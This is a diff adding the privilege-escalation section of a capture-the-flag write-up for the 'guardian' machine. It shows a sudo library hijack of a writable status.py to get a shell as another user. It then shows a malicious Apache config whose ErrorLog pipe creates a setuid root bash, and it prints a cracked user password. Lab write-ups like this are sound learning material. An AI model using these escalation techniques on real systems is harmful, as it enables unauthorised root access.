@@ -231,3 +231,145 @@ jamil.enockson:copperhouse56
 so maybe jamil is our only way in, lets try to ssh in as jamil and hope he used the same password for ssh:\
 ![alt text](image-36.png)\
 user flag done !\
+now lets do some priv esc:
+```
+jamil@guardian:~$ sudo -l
+Matching Defaults entries for jamil on guardian:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jamil may run the following commands on guardian:
+    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py
+```
+
+lets check utilities.py:
+```
+jamil@guardian:~$ cat /opt/scripts/utilities/utilities.py
+#!/usr/bin/env python3
+
+import argparse
+import getpass
+import sys
+
+from utils import db
+from utils import attachments
+from utils import logs
+from utils import status
+
+
+def main():
+    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
+    parser.add_argument("action", choices=[
+        "backup-db",
+        "zip-attachments",
+        "collect-logs",
+        "system-status"
+    ], help="Action to perform")
+    
+    args = parser.parse_args()
+    user = getpass.getuser()
+
+    if args.action == "backup-db":
+        if user != "mark":
+            print("Access denied.")
+            sys.exit(1)
+        db.backup_database()
+    elif args.action == "zip-attachments":
+        if user != "mark":
+            print("Access denied.")
+            sys.exit(1)
+        attachments.zip_attachments()
+    elif args.action == "collect-logs":
+        if user != "mark":
+            print("Access denied.")
+            sys.exit(1)
+        logs.collect_logs()
+    elif args.action == "system-status":
+        status.system_status()
+    else:
+        print("Unknown action.")
+
+if __name__ == "__main__":
+    main()
+
+```
+
+maybe we could hijack the libraries, lets check utils:
+```
+jamil@guardian:~$ ls /opt/scripts/utilities
+output  utilities.py  utils
+jamil@guardian:~$ ls /opt/scripts/utilities/utils
+attachments.py  db.py  logs.py  status.py
+jamil@guardian:~$ ls -la /opt/scripts/utilities/utils
+total 24
+drwxrwsr-x 2 root root   4096 Jul 10  2025 .
+drwxr-sr-x 4 root admins 4096 Jul 10  2025 ..
+-rw-r----- 1 root admins  287 Apr 19  2025 attachments.py
+-rw-r----- 1 root admins  246 Jul 10  2025 db.py
+-rw-r----- 1 root admins  226 Apr 19  2025 logs.py
+-rwxrwx--- 1 mark admins  253 Apr 26  2025 status.py
+
+```
+
+so we can overwrite and hijack status.py, but only run it as mark, so lets do it to get shell as mark, maybe we could find a way using him:\
+and well overwrite system_status to open shell:
+```
+cat > status.py << 'EOF'
+import os
+def system_status():
+    os.system("/bin/bash")
+EOF
+```
+and then : 
+```
+sudo -u mark /opt/scripts/utilities/utilities.py system-status
+```
+and there we are : 
+```
+jamil@guardian:/opt/scripts/utilities/utils$ sudo -u mark /opt/scripts/utilities/utilities.py system-status
+mark@guardian:/opt/scripts/utilities/utils$ whoami
+mark
+
+```
+let's just hope we can get root now:\
+```
+mark@guardian:~$ sudo -l
+Matching Defaults entries for mark on guardian:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User mark may run the following commands on guardian:
+    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
+
+```
+ok so its something to do with safeapache2ctl:
+```
+mark@guardian:~$ sudo /usr/local/bin/safeapache2ctl
+Usage: /usr/local/bin/safeapache2ctl -f /home/mark/confs/file.conf
+
+```
+
+alright i've seen this before, well prolly load it with an evil config, but let's see first:\
+```
+LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so\nErrorLog "|/bin/bash -c '\''cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'\''"\n
+```
+we save this as evil.conf and lets run it, but it kept saying : "Action '-f /home/mark/confs/evil.conf' failed."\
+after some ai debugging : here's the updated evil.conf:
+```
+ServerName localhost
+LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so
+Listen 127.0.0.1:8080
+ErrorLog "|/bin/bash -c 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'"
+
+```
+
+and ...\
+![alt text](image-37.png)\
+got the root flag\
+![alt text](image-38.png)\
+My first hard machine,
+
+for this machine, I relied a bit more on ai and nudges since i was getting stuck alot, because ai can read big codebases and spot stuff, nevertheless I learned alot from this machine, and it was really fun, took me 2 days:\
+what i learned from this machine is the following:
+- csrf and how it works
+- how to bypass php regex with filter chains
+
+and some more stuff, really fun machine .
